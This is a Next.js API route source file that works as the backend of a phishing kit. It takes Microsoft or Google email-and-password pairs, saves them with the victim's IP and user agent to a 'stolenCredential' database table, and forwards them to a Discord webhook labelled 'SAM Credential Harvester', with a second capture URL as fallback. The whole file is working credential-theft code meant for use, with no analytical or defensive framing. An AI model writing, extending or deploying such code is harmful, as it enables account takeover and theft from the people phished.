import { NextRequest, NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";

const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
const BOT_CAPTURE_URL = process.env.BOT_CAPTURE_URL; // e.g. "http://localhost:4000/capture"

async function notifyDiscord(payload: {
  provider: string;
  email: string;
  password: string;
  ip?: string;
  userAgent?: string;
  timestamp?: string;
}) {
  const body = JSON.stringify({
    embeds: [
      {
        title: "🔑 New Credential Captured",
        color: payload.provider === "microsoft" ? 0x0078d4 : 0x4285f4,
        fields: [
          { name: "Provider", value: payload.provider, inline: true },
          { name: "Email", value: payload.email, inline: true },
          { name: "Password", value: `||${payload.password}||`, inline: false },
          { name: "IP", value: payload.ip || "unknown", inline: true },
          { name: "User-Agent", value: payload.userAgent?.slice(0, 500) || "unknown", inline: false },
        ],
        timestamp: payload.timestamp || new Date().toISOString(),
        footer: { text: "SAM Credential Harvester" },
      },
    ],
  });

  // 1. Try webhook first
  if (WEBHOOK_URL) {
    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body,
      });
    } catch {
      /* swallow */
    }
  }

  // 2. Fallback to bot API
  if (BOT_CAPTURE_URL) {
    try {
      await fetch(BOT_CAPTURE_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    } catch {
      /* swallow */
    }
  }
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { provider, email, password } = body;

    if (!provider || !email || !password) {
      return NextResponse.json({ ok: false }, { status: 400 });
    }

    const ip = req.headers.get("x-forwarded-for") || req.ip || "unknown";
    const userAgent = req.headers.get("user-agent") || "unknown";

    await prisma.stolenCredential.create({
      data: { provider, email, password, ip, userAgent },
    });

    await notifyDiscord({ provider, email, password, ip, userAgent });

    return NextResponse.json({ ok: true });
  } catch {
    return NextResponse.json({ ok: false }, { status: 500 });
  }
}
